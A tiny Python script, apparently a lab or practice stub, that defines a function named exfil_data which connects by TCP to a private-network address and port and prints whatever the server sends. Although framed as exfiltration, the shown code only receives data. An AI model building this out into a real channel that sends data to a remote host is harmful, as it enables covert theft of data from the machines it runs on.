import socket
import os

def exfil_data():
    SERVER = '192.168.29.131'
    PORT = 8865

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((SERVER,PORT))

    print(client.recv(1024).decode())




exfil_data()
